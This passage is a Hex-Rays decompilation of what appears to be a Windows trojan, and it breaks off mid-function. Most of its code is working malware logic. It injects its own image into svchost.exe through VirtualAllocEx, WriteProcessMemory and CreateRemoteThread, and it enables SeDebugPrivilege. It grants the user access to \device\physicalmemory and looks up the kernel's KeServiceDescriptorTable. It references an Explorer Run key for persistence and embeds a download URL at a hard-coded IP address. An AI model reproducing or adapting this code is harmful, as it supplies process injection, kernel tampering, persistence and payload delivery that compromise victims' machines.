/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// DWORD __stdcall GetSecurityInfo(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID *ppsidOwner, PSID *ppsidGroup, PACL *ppDacl, PACL *ppSacl, PSECURITY_DESCRIPTOR *ppSecurityDescriptor);
// BOOL __stdcall GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
// DWORD __stdcall SetEntriesInAclA(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_A pListOfExplicitEntries, PACL OldAcl, PACL *NewAcl);
// DWORD __stdcall SetSecurityInfo(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID psidOwner, PSID psidGroup, PACL pDacl, PACL pSacl);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// HANDLE __stdcall GetProcessHeap();
// BOOL __stdcall GetFileInformationByHandle(HANDLE hFile, LPBY_HANDLE_FILE_INFORMATION lpFileInformation);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall IsBadReadPtr(const void *lp, UINT_PTR ucb);
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// LPVOID __stdcall VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// HANDLE __stdcall CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// int __stdcall lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// BOOL __stdcall IsDebuggerPresent();
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
DWORD __cdecl sub_13141340(LPCSTR lpString1);
BOOL __cdecl sub_131413D7(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress);
int __cdecl sub_13141442(_BYTE *a1);
BOOL __cdecl sub_13141454(char *a1, _BYTE *a2);
char __cdecl sub_13141492(_DWORD *a1, void *a2, void *a3, void *a4, _DWORD *a5);
unsigned int __cdecl sub_131414E2(int a1, int a2, int a3, int a4);
int __cdecl sub_1314153E(unsigned int a1, unsigned int a2);
char __cdecl sub_13141558(__m128i *a1, int a2, int a3, int a4, int a5, __m128i *a6);
__m128i *__cdecl sub_131415DD(LPCSTR lpString2);
int __cdecl sub_1314177C(int a1, _BYTE *a2);
int __cdecl sub_131417F3(int a1, int a2, unsigned int a3);
BOOL sub_131418AE();
int sub_1314195D();
int __cdecl sub_131419C3(int a1, int *a2, int *a3, _DWORD *a4);
int __cdecl sub_13141A0C(int a1);
int sub_13141A19();
int sub_13141B39();
int __cdecl sub_13141BDF(int a1, int a2, _DWORD *a3);
int __cdecl sub_13141C57(int a1, int a2, _DWORD *a3);
LPVOID __cdecl sub_13141CFF(SIZE_T dwBytes);
int __stdcall StartAddress(LPVOID lpThreadParameter); // idb
BOOL sub_13141DC8();
char sub_13141E2C();
int __stdcall start(int a1, int a2, int a3, int a4);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// HRESULT __stdcall URLDownloadToFileA(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
__m128i *__cdecl sub_131420F0(__m128i *a1, __m128i *a2, unsigned int a3);
size_t __cdecl strlen(const char *Str);
void __cdecl __noreturn __report_gsfailure();
void __cdecl fastcopy_I(__m128i *a1, const __m128i *a2, unsigned int a3);
__m128i *__cdecl unknown_libname_248(__m128i *a1, const __m128i *a2, unsigned int a3);
int sub_13142759();
void sub_1314276D();
int has_osfxsr_set();
BOOL unknown_libname_274();
int sub_13142825();
int __cdecl _except_handler4(int, PVOID TargetFrame, int); // idb
// int __usercall _local_unwind4_0@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4);
int __cdecl _unwind_handler4(int a1, _DWORD *a2, int a3, _DWORD *a4);
int __thiscall sub_13142B1A(int (*this)(void));
void __thiscall sub_13142B4A(PVOID TargetFrame);
int __fastcall sub_13142B64(int a1, unsigned int a2, int a3, _DWORD *a4);
BOOL __cdecl _ValidateImageBase(int a1);
int __cdecl _FindPESection(int a1, unsigned int a2);
BOOL __cdecl sub_13142BF2(int a1);
int __cdecl __spoils<eax,ecx,edx> _unwind_handler(int a1, int a2, int a3, _DWORD *a4, int a5);
int __cdecl __spoils<eax,ecx,edx> _local_unwind2(int a1, unsigned int a2);
// int __userpurge sub_13142D75@<eax>(int result@<eax>, int a2@<ebp>, int a3);
// int __usercall sub_13142D94@<eax>(int (*a1)(void)@<eax>);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
NTSTATUS __stdcall RtlAnsiStringToUnicodeString(PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString);
void __stdcall RtlInitAnsiString(PANSI_STRING DestinationString, PCSZ SourceString);
void __stdcall RtlFreeUnicodeString(PUNICODE_STRING UnicodeString);

//-------------------------------------------------------------------------
// Data declarations

CHAR aZwquerysystemi[] = "ZwQuerySystemInformation"; // idb
CHAR aNtunmapviewofs[] = "NtUnmapViewOfSection"; // idb
CHAR aNtmapviewofsec[] = "NtMapViewOfSection"; // idb
CHAR aNtopensection[] = "NtOpenSection"; // idb
CHAR aRtlfreeunicode[] = "RtlFreeUnicodeString"; // idb
CHAR aRtlinitansistr[] = "RtlInitAnsiString"; // idb
CHAR ProcName[] = "RtlAnsiStringToUnicodeString"; // idb
CHAR ModuleName[] = "ntdll.dll"; // idb
char SourceString[] = "\\device\\physicalmemory"; // idb
char aNtoskrnlExe_0[13] = "ntoskrnl.exe"; // weak
CHAR SubKey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run"; // idb
CHAR Class[4] = { '\0', '\0', '\0', '\0' }; // idb
CHAR ValueName[40] = "http://91.213.72.10/pinesk/pinec/pinesk1"; // idb
BYTE Str[] =
{
  46u,
  101u,
  120u,
  101u,
  73u,
  78u,
  68u,
  79u,
  87u,
  83u,
  92u,
  110u,
  111u,
  116u,
  101u,
  112u,
  49u,
  46u,
  101u,
  120u,
  101u,
  0u
}; // idb
CHAR aUser32Dll[] = "USER32_DLL"; // idb
CHAR aWinmmDll[] = "WINMM_DLL"; // idb
CHAR aWininetDll[] = "WININET_DLL"; // idb
CHAR aUrlmonDll_0[] = "URLMON_DLL"; // idb
CHAR aWs232Dll[] = "WS2_32_DLL"; // idb
CHAR aShell32Dll[] = "SHELL32_DLL"; // idb
CHAR aImghlpDll[] = "IMGHLP_DLL"; // idb
CHAR aAdvapi32Dll_0[] = "ADVAPI32_DLL"; // idb
CHAR LibFileName[] = "KERNEL32_DLL"; // idb
CHAR Name[] = "SeDebugPrivilege"; // idb
CHAR aNtdllDll_0[] = "\\ntdll.dll"; // idb
char aKeservicedescr[25] = "KeServiceDescriptorTable"; // weak
CHAR String2[] = "\\ntoskrnl.exe"; // idb
CHAR String1[] = "svchost.exe"; // idb
struct _EXCEPTION_POINTERS ExceptionInfo = { &dword_13144048, &dword_131440A0 }; // idb
_UNKNOWN loc_13142B5F; // weak
uintptr_t __security_cookie = 3141592654u;
_DWORD dword_13144010[4] = { 429065504, 0, 0, 0 }; // idb
int (__stdcall *NtMapViewOfSection)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *NtUnmapViewOfSection)(_DWORD, _DWORD) = NULL; // weak
int dword_13144028 = 0; // weak
int (__stdcall *dword_1314402C)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
HANDLE hHeap = NULL; // idb
int (__stdcall *NtOpenSection)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_13144048 = 0; // weak
int dword_1314404C = 0; // weak
int dword_13144054 = 0; // weak
int dword_13144098 = 0; // weak
int dword_131440A0 = 0; // weak
__int16 word_1314412C = 0; // weak
__int16 word_13144130 = 0; // weak
__int16 word_13144134 = 0; // weak
__int16 word_13144138 = 0; // weak
int dword_1314413C = 0; // weak
int dword_13144140 = 0; // weak
int dword_13144144 = 0; // weak
int dword_13144148 = 0; // weak
int dword_1314414C = 0; // weak
int dword_13144150 = 0; // weak
int dword_13144154 = 0; // weak
int dword_13144158 = 0; // weak
__int16 word_1314415C = 0; // weak
int dword_13144160 = 0; // weak
int dword_13144164 = 0; // weak
__int16 word_13144168 = 0; // weak
int (__cdecl *dword_1314436C)(_DWORD, _DWORD); // weak
int dword_13144370; // weak
int dword_13144374; // weak
int dword_13144378; // weak


//----- (13141340) --------------------------------------------------------
DWORD __cdecl sub_13141340(LPCSTR lpString1)
{
  HANDLE v1; // edi
  DWORD result; // eax
  DWORD v3; // esi
  PROCESSENTRY32 pe; // [esp+8h] [ebp-12Ch] BYREF

  v1 = CreateToolhelp32Snapshot(2u, 0);
  if ( v1 == (HANDLE)-1 )
    return 0;
  pe.dwSize = 296;
  if ( Process32First(v1, &pe) )
  {
    while ( lstrcmpiA(lpString1, pe.szExeFile) )
    {
      if ( !Process32Next(v1, &pe) )
      {
        v3 = 1;
        goto LABEL_5;
      }
    }
    CloseHandle(v1);
    result = pe.th32ProcessID;
  }
  else
  {
    v3 = 0;
LABEL_5:
    CloseHandle(v1);
    result = v3;
  }
  return result;
}

//----- (131413D7) --------------------------------------------------------
BOOL __cdecl sub_131413D7(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress)
{
  HMODULE v2; // esi
  SIZE_T v3; // edi
  void *v4; // ebx
  BOOL result; // eax
  DWORD ThreadId; // [esp+Ch] [ebp-8h] BYREF
  SIZE_T NumberOfBytesWritten; // [esp+10h] [ebp-4h] BYREF

  v2 = GetModuleHandleA(0);
  v3 = *(_DWORD *)((char *)v2 + *((_DWORD *)v2 + 15) + 80);
  v4 = VirtualAllocEx(hProcess, v2, v3, 0x3000u, 0x40u);
  if ( v4 && (WriteProcessMemory(hProcess, v4, v2, v3, &NumberOfBytesWritten), NumberOfBytesWritten == v3) )
    result = CreateRemoteThread(hProcess, 0, 0, lpStartAddress, v4, 0, &ThreadId) != 0;
  else
    result = 0;
  return result;
}

//----- (13141442) --------------------------------------------------------
int __cdecl sub_13141442(_BYTE *a1)
{
  _BYTE *v1; // ecx
  int result; // eax

  v1 = a1;
  for ( result = 0; *v1; ++v1 )
    ++result;
  return result;
}

//----- (13141454) --------------------------------------------------------
BOOL __cdecl sub_13141454(char *a1, _BYTE *a2)
{
  char *v2; // ecx
  char v3; // al

  v2 = a1;
  v3 = *a1;
  if ( !*a1 )
    goto LABEL_8;
  do
  {
    if ( !*a2 )
      break;
    if ( v3 != *a2 )
      return 0;
    v3 = *++v2;
    ++a2;
  }
  while ( *v2 );
  v3 = *v2;
  if ( *v2 )
  {
    if ( !*a2 )
      return 0;
  }
  else
  {
LABEL_8:
    if ( !*a2 )
      return 1;
  }
  return v3 != 0;
}

//----- (13141492) --------------------------------------------------------
char __cdecl sub_13141492(_DWORD *a1, void *a2, void *a3, void *a4, _DWORD *a5)
{
  _WORD *v6; // eax

  if ( *(_WORD *)a1 != 23117 )
    return 0;
  v6 = (_WORD *)((char *)a1 + a1[15]);
  if ( v6[10] != 224 )
    return 0;
  qmemcpy(a2, a1, 0x40u);
  qmemcpy(a3, v6, 0x18u);
  qmemcpy(a4, v6 + 12, 0xE0u);
  *a5 = v6 + 124;
  return 1;
}

//----- (131414E2) --------------------------------------------------------
unsigned int __cdecl sub_131414E2(int a1, int a2, int a3, int a4)
{
  unsigned int v4; // ecx
  unsigned int v5; // esi
  unsigned int *v6; // ebx
  unsigned int v7; // edi
  int v9; // [esp+14h] [ebp+10h]

  v4 = *(_DWORD *)(a3 + 60);
  v5 = *(_DWORD *)(a3 + 32);
  if ( v4 % v5 )
    v4 = v5 * (*(_DWORD *)(a3 + 60) / v5 + 1);
  if ( *(_WORD *)(a2 + 6) )
  {
    v6 = (unsigned int *)(a4 + 8);
    v9 = *(unsigned __int16 *)(a2 + 6);
    do
    {
      v7 = *v6;
      if ( *v6 )
      {
        if ( v7 % v5 )
          v4 += v5 * (v7 / v5 + 1);
        else
          v4 += v7;
      }
      v6 += 10;
      --v9;
    }
    while ( v9 );
  }
  return v4;
}

//----- (1314153E) --------------------------------------------------------
int __cdecl sub_1314153E(unsigned int a1, unsigned int a2)
{
  int result; // eax

  if ( a1 % a2 )
    result = a2 * (a1 / a2 + 1);
  else
    result = a1;
  return result;
}

//----- (13141558) --------------------------------------------------------
char __cdecl sub_13141558(__m128i *a1, int a2, int a3, int a4, int a5, __m128i *a6)
{
  __m128i *v6; // ebx
  unsigned int *v7; // edi
  unsigned int v8; // eax
  unsigned int v9; // ecx
  int v11; // [esp+24h] [ebp+1Ch]

  sub_131420F0(a6, a1, *(_DWORD *)(a4 + 60));
  v6 = (__m128i *)((char *)a6 + sub_1314153E(*(_DWORD *)(a4 + 60), *(_DWORD *)(a4 + 32)));
  v11 = 0;
  if ( *(_WORD *)(a3 + 6) )
  {
    v7 = (unsigned int *)(a5 + 8);
    do
    {
      v8 = v7[2];
      if ( v8 )
      {
        v9 = v7[2];
        if ( v8 > *v7 )
          v9 = *v7;
        sub_131420F0(v6, (__m128i *)((char *)a1 + v7[3]), v9);
        v6 = (__m128i *)((char *)v6 + sub_1314153E(*v7, *(_DWORD *)(a4 + 32)));
      }
      ++v11;
      v7 += 10;
    }
    while ( v11 < *(unsigned __int16 *)(a3 + 6) );
  }
  return 1;
}

//----- (131415DD) --------------------------------------------------------
__m128i *__cdecl sub_131415DD(LPCSTR lpString2)
{
  int v1; // eax
  int v2; // edx
  HANDLE v4; // eax
  HANDLE v5; // eax
  void *v6; // eax
  HANDLE v7; // eax
  __m128i *v8; // eax
  HANDLE v9; // eax
  DWORD v10; // [esp-4h] [ebp-CCh]
  unsigned int v11; // [esp-4h] [ebp-CCh]
  void *v12; // [esp-4h] [ebp-CCh]
  char v13[224]; // [esp+Ch] [ebp-BCh] BYREF
  struct _BY_HANDLE_FILE_INFORMATION FileInformation; // [esp+ECh] [ebp+24h] BYREF
  char v15[24]; // [esp+120h] [ebp+58h] BYREF
  DWORD NumberOfBytesRead; // [esp+138h] [ebp+70h] BYREF
  __m128i *v17; // [esp+13Ch] [ebp+74h]
  HANDLE hFile; // [esp+140h] [ebp+78h]
  LPVOID lpMem; // [esp+144h] [ebp+7Ch]
  DWORD nNumberOfBytesToRead; // [esp+148h] [ebp+80h] BYREF
  char v21[64]; // [esp+14Ch] [ebp+84h] BYREF
  CHAR Buffer[264]; // [esp+18Ch] [ebp+C4h] BYREF

  v17 = 0;
  GetSystemDirectoryA(Buffer, 0x104u);
  sub_13141442(lpString2);
  v1 = sub_13141442(Buffer);
  if ( (unsigned int)(v1 + v2) >= 0x104 )
    return 0;
  lstrcatA(Buffer, lpString2);
  v4 = CreateFileA(Buffer, 0x80000000, 1u, 0, 3u, 0, 0);
  hFile = v4;
  if ( v4 != (HANDLE)-1 )
  {
    GetFileInformationByHandle(v4, &FileInformation);
    nNumberOfBytesToRead = FileInformation.nFileSizeLow;
    if ( FileInformation.nFileSizeLow )
    {
      v10 = FileInformation.nFileSizeLow;
      v5 = GetProcessHeap();
      v6 = HeapAlloc(v5, 0, v10);
      lpMem = v6;
      if ( v6 )
      {
        if ( ReadFile(hFile, v6, nNumberOfBytesToRead, &NumberOfBytesRead, 0)
          && NumberOfBytesRead == nNumberOfBytesToRead
          && sub_13141492(lpMem, v21, v15, v13, &nNumberOfBytesToRead) )
        {
          v11 = sub_131414E2((int)v21, (int)v15, (int)v13, nNumberOfBytesToRead);
          v7 = GetProcessHeap();
          v8 = (__m128i *)HeapAlloc(v7, 0, v11);
          v17 = v8;
          if ( v8 )
            sub_13141558((__m128i *)lpMem, (int)v21, (int)v15, (int)v13, nNumberOfBytesToRead, v8);
        }
        v12 = lpMem;
        v9 = GetProcessHeap();
        HeapFree(v9, 0, v12);
      }
    }
    CloseHandle(hFile);
  }
  return v17;
}
// 1314162D: variable 'v2' is possibly undefined

//----- (1314177C) --------------------------------------------------------
int __cdecl sub_1314177C(int a1, _BYTE *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v5; // esi
  int v6; // ebx
  int v8; // [esp+Ch] [ebp-8h]
  unsigned int v9; // [esp+10h] [ebp-4h]
  int v10; // [esp+1Ch] [ebp+8h]

  if ( !a1 )
    return 0;
  if ( !a2 )
    return 0;
  v3 = *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 120);
  v10 = 0;
  v4 = (_DWORD *)(a1 + v3);
  v5 = a1 + v4[8];
  v6 = a1 + v4[9];
  v9 = v4[6];
  v8 = a1 + v4[7];
  if ( !v9 )
    return 0;
  while ( !sub_13141454((char *)(a1 + *(_DWORD *)(v5 + 4 * v10)), a2) )
  {
    if ( ++v10 >= v9 )
      return 0;
  }
  return *(_DWORD *)(v8 + 4 * *(unsigned __int16 *)(v6 + 2 * v10));
}

//----- (131417F3) --------------------------------------------------------
int __cdecl sub_131417F3(int a1, int a2, unsigned int a3)
{
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  int v7; // ebx
  int v8; // edi
  int v9; // eax
  int v10; // edx
  int v11; // edi
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  bool v15; // zf
  unsigned int v16; // ecx
  unsigned int v17; // [esp+4h] [ebp-8h]
  int v18; // [esp+8h] [ebp-4h]
  unsigned int v19; // [esp+14h] [ebp+8h]

  if ( !a1 )
    return 0;
  v5 = (_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)(a1 + 60) + a1 + 120));
  v6 = v5[6];
  v7 = v5[9];
  v8 = v5[8];
  v9 = a1 + v5[7];
  v10 = 0;
  v11 = a1 + v8;
  v12 = a1 + v7;
  v17 = v6;
  v18 = v9;
  v19 = 0;
  if ( v6 )
  {
    while ( 1 )
    {
      v13 = a1 + *(_DWORD *)(v9 + 4 * *(unsigned __int16 *)(v12 + 2 * v10));
      v14 = a1 + *(_DWORD *)(v11 + 4 * v10);
      if ( dword_13144028 )
      {
        if ( dword_13144028 != 1
          || *(_BYTE *)v13 != 0xB8
          || *(_BYTE *)(v13 + 5) != 0xBA
          || *(_BYTE *)(v13 + 6)
          || *(_BYTE *)(v13 + 7) != 3
          || *(_BYTE *)(v13 + 8) != 0xFE )
        {
          goto LABEL_20;
        }
        v15 = *(_BYTE *)(v13 + 9) == 127;
      }
      else
      {
        if ( *(_BYTE *)v13 != 0xB8 || *(_BYTE *)(v13 + 9) != 0xCD )
          goto LABEL_20;
        v15 = *(_BYTE *)(v13 + 10) == 46;
      }
      if ( v15 )
      {
        v16 = *(_DWORD *)(v13 + 1);
        if ( v16 < a3 )
          *(_DWORD *)(a2 + 4 * v16) = v14;
      }
LABEL_20:
      v10 = ++v19;
      if ( v19 >= v17 )
        return 1;
      v9 = v18;
    }
  }
  return 1;
}
// 13144028: using guessed type int dword_13144028;

//----- (131418AE) --------------------------------------------------------
BOOL sub_131418AE()
{
  HMODULE v0; // edi
  FARPROC ZwQuerySystemInformation; // eax

  v0 = GetModuleHandleA(ModuleName);
  *(_DWORD *)RtlAnsiStringToUnicodeString = GetProcAddress(v0, ProcName);
  *(_DWORD *)RtlInitAnsiString = GetProcAddress(v0, aRtlinitansistr);
  *(_DWORD *)RtlFreeUnicodeString = GetProcAddress(v0, aRtlfreeunicode);
  NtOpenSection = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(v0, aNtopensection);
  NtMapViewOfSection = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(v0, aNtmapviewofsec);
  NtUnmapViewOfSection = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress(v0, aNtunmapviewofs);
  ZwQuerySystemInformation = GetProcAddress(v0, aZwquerysystemi);
  dword_1314402C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))ZwQuerySystemInformation;
  return *(_DWORD *)RtlAnsiStringToUnicodeString
      && *(_DWORD *)RtlInitAnsiString
      && *(_DWORD *)RtlFreeUnicodeString
      && NtOpenSection
      && NtMapViewOfSection
      && NtUnmapViewOfSection
      && ZwQuerySystemInformation;
}
// 13144020: using guessed type int (__stdcall *NtMapViewOfSection)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 13144024: using guessed type int (__stdcall *NtUnmapViewOfSection)(_DWORD, _DWORD);
// 1314402C: using guessed type int (__stdcall *dword_1314402C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1314403C: using guessed type int (__stdcall *NtOpenSection)(_DWORD, _DWORD, _DWORD);

//----- (1314195D) --------------------------------------------------------
int sub_1314195D()
{
  int result; // eax
  int v1[6]; // [esp+0h] [ebp-2Ch] BYREF
  UNICODE_STRING v2; // [esp+18h] [ebp-14h] BYREF
  STRING DestinationString; // [esp+20h] [ebp-Ch] BYREF
  int v4; // [esp+28h] [ebp-4h] BYREF

  RtlInitAnsiString(&DestinationString, SourceString);
  if ( RtlAnsiStringToUnicodeString(&v2, &DestinationString, 1u)
    || (v1[1] = 0, v1[4] = 0, v1[5] = 0, v1[0] = 24, v1[3] = 64, v1[2] = (int)&v2, NtOpenSection(&v4, 6, v1)) )
  {
    result = -1;
  }
  else
  {
    result = v4;
  }
  return result;
}
// 1314403C: invalid function type has been ignored
// 1314403C: using guessed type int (__stdcall *NtOpenSection)(_DWORD, _DWORD, _DWORD);

//----- (131419C3) --------------------------------------------------------
int __cdecl sub_131419C3(int a1, int *a2, int *a3, _DWORD *a4)
{
  int v5; // [esp-18h] [ebp-28h]
  int v6[2]; // [esp+8h] [ebp-8h] BYREF

  *a4 = 0;
  v6[0] = *a2;
  v5 = *a3;
  v6[1] = 0;
  if ( NtMapViewOfSection(a1, -1, a4, 0, v5, v6, a3, 1, 0, 4) )
    return 0;
  *a2 = v6[0];
  return 1;
}
// 13144020: invalid function type has been ignored
// 13144020: using guessed type int (__stdcall *NtMapViewOfSection)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (13141A0C) --------------------------------------------------------
int __cdecl sub_13141A0C(int a1)
{
  return NtUnmapViewOfSection(-1, a1);
}
// 13144024: invalid function type has been ignored
// 13144024: using guessed type int (__stdcall *NtUnmapViewOfSection)(_DWORD, _DWORD);

//----- (13141A19) --------------------------------------------------------
int sub_13141A19()
{
  int v0; // esi
  STRING DestinationString; // [esp+8h] [ebp-80h] BYREF
  UNICODE_STRING v3; // [esp+10h] [ebp-78h] BYREF
  PSECURITY_DESCRIPTOR ppSecurityDescriptor; // [esp+18h] [ebp-70h] BYREF
  struct _EXPLICIT_ACCESS_A pListOfExplicitEntries; // [esp+1Ch] [ebp-6Ch] BYREF
  _DWORD v6[6]; // [esp+3Ch] [ebp-4Ch] BYREF
  DWORD pcbBuffer; // [esp+54h] [ebp-34h] BYREF
  PACL ppDacl; // [esp+58h] [ebp-30h] BYREF
  HANDLE handle; // [esp+5Ch] [ebp-2Ch] BYREF
  PACL NewAcl; // [esp+60h] [ebp-28h] BYREF
  CHAR Buffer[260]; // [esp+64h] [ebp-24h] BYREF

  v0 = 0;
  RtlInitAnsiString(&DestinationString, SourceString);
  if ( RtlAnsiStringToUnicodeString(&v3, &DestinationString, 1u) )
    return 0;
  v6[2] = &v3;
  v6[0] = 24;
  v6[1] = 0;
  v6[3] = 64;
  v6[4] = 0;
  v6[5] = 0;
  if ( NtOpenSection(&handle, 393216, v6) )
    return 0;
  if ( !GetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, &ppDacl, 0, &ppSecurityDescriptor) )
  {
    pcbBuffer = 259;
    GetUserNameA(Buffer, &pcbBuffer);
    pListOfExplicitEntries.Trustee.ptstrName = Buffer;
    pListOfExplicitEntries.grfAccessPermissions = 2;
    pListOfExplicitEntries.grfAccessMode = GRANT_ACCESS;
    pListOfExplicitEntries.grfInheritance = 0;
    pListOfExplicitEntries.Trustee.pMultipleTrustee = 0;
    pListOfExplicitEntries.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
    pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_USER;
    if ( !SetEntriesInAclA(1u, &pListOfExplicitEntries, ppDacl, &NewAcl) )
    {
      if ( !SetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, NewAcl, 0) )
        v0 = 1;
      LocalFree(NewAcl);
    }
  }
  return v0;
}
// 1314403C: using guessed type int (__stdcall *NtOpenSection)(_DWORD, _DWORD, _DWORD);

//----- (13141B39) --------------------------------------------------------
int sub_13141B39()
{
  SIZE_T v0; // edi
  char *v1; // eax
  char *v2; // esi
  int v3; // eax
  int v4; // edi
  _DWORD *v5; // eax
  char *v6; // ebx
  int v8; // edi
  HANDLE hHeap; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  hHeap = GetProcessHeap();
  v0 = 0x8000;
  v10 = -2143289344;
  while ( 1 )
  {
    v1 = (char *)HeapAlloc(hHeap, 0, v0);
    v2 = v1;
    if ( !v1 )
      return -2143289344;
    v3 = dword_1314402C(11, v1, v0, 0);
    if ( v3 != -1073741820 )
      break;
    HeapFree(hHeap, 0, v2);
    v0 *= 2;
  }
  if ( v3 )
  {
    v8 = -2143289344;
  }
  else
  {
    v4 = 0;
    v5 = v2 + 4;
    if ( *(_DWORD *)v2 )
    {
      v6 = v2 + 32;
      while ( v6 == aNtoskrnlExe_0 )
      {
        v5 += 71;
        v6 += 284;
        if ( (unsigned int)++v4 >= *(_DWORD *)v2 )
          goto LABEL_15;
      }
      v10 = v5[2];
    }
LABEL_15:
    v8 = v10;
  }
  HeapFree(hHeap, 0, v2);
  return v8;
}
// 1314402C: invalid function type has been ignored
// 1314402C: using guessed type int (__stdcall *dword_1314402C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (13141BDF) --------------------------------------------------------
int __cdecl sub_13141BDF(int a1, int a2, _DWORD *a3)
{
  int v4; // eax
  _DWORD *v5; // ecx
  _DWORD *v6; // esi
  int v8; // [esp+1Ch] [ebp+10h]

  v4 = a3[34];
  if ( !v4 )
    return 0;
  if ( !a3[35] )
    return 0;
  v5 = (_DWORD *)(v4 + a1);
  if ( !*(_DWORD *)(v4 + a1 + 4) )
    return 0;
  while ( 1 )
  {
    v8 = 0;
